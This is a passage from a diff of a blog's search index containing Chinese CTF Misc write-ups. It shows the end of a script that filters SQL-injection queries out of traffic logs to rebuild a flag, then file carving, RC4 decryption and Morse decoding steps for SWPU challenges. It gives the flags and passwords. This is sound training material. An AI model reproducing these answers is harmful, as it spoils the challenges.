re.search(&#x27;(select%20flag%20from%20sqli.flag)&#x27;, line):</span><br><span class="line">            if re.search(&#x27;479|480|481|482&#x27;, line):</span><br><span class="line">                line = re.findall(&quot;%20=%20&#x27;(.+)&#x27;,1,&quot;, line)[0]</span><br><span class="line">                flag += line</span><br><span class="line">                print(flag)</span><br></pre></td></tr></table></figure><p>最后得到flag值<code>flag&#123;deddcd67-bcfd-487e-b940-1217e668c7db&#125;</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2020]套娃</title>
+      <link href="/2023/08/27/%5BSWPU%202020%5D%E5%A5%97%E5%A8%83/"/>
+      <url>/2023/08/27/%5BSWPU%202020%5D%E5%A5%97%E5%A8%83/</url>
+      
+        <content type="html"><![CDATA[<p>使用<code>binwalk</code>分离文件</p><p><img src="https://imag.keyblue.cn/imag/202308271106253.png" alt="image-20230827110617216"></p><p>分离出一个压缩包内含两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271109438.png" alt="image-20230827110902406"></p><p>打开txt文件发现内部是rc4密文<code>U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p</code>，需要找到key</p><p><img src="https://imag.keyblue.cn/imag/202308271110484.png" alt="image-20230827111004446"></p><p>对swpu.xls解压，内部含有两个文件</p><p><img src="https://imag.keyblue.cn/imag/202308271112716.png" alt="image-20230827111208681"></p><p>解压rc4key.zip需要密码，esayrc4.xlsx无法再次解压，随即使用010打开查看，</p><p><img src="https://imag.keyblue.cn/imag/202308271114279.png" alt="image-20230827111437244"></p><p>拉到最后，发现密码为<code>6e4c834d77cba03af41e1562a5bce84e</code></p><p>使用在在线解密工具得到明文为<code>ef1a73d40977a49b99b871980f355757</code></p><p><img src="https://imag.keyblue.cn/imag/202308271116714.png" alt="image-20230827111624674"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUp </category>
+          
+          <category> Misc </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>[SWPU 2019]神奇的二维码</title>
+      <link href="/2023/08/27/%5BSWPU%202019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
+      <url>/2023/08/27/%5BSWPU%202019%5D%E7%A5%9E%E5%A5%87%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<p>使用<code>foremost -i MISC-神奇的二维码-BitcoinPay.png</code>未分离出内容</p><p><img src="https://imag.keyblue.cn/imag/202308271014365.png" alt="foremost分离"></p><p>使用<code>binwalk -e *.png --run-as=root</code>分离出多个rar压缩包</p><p><img src="https://imag.keyblue.cn/imag/202308271016763.png" alt="image-20230827101620731"></p><p><img src="https://imag.keyblue.cn/imag/202308271019800.png" alt="image-20230827101958767"></p><ul><li><p>解密<code>flag.doc</code>中的内容，得到<code>comEON_YOuAreSOSoS0great</code>，据测试是<code>18394.rar</code>的密码，解开压缩包得到<code>good.mp3</code></p></li><li><p>解密<code>encode.txt</code>中的内容得到<code>asdfghjkl1234567890</code>，据测试是<code>看看flag在不在里面^_^.rar</code> 的密码，解开压缩包得到<code>flag.jpg</code></p></li></ul><p>使用<code>Audacity64.exe</code>打开<code>good.mp3</code>发现是莫斯电码，记录得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--</span><br><span class="line"></span><br><span class="line">解码后：morseisveryveryeasy</span><br></pre></td></tr></table></figure><p>提交flag</p>]]></content>
       
       
       <categories>
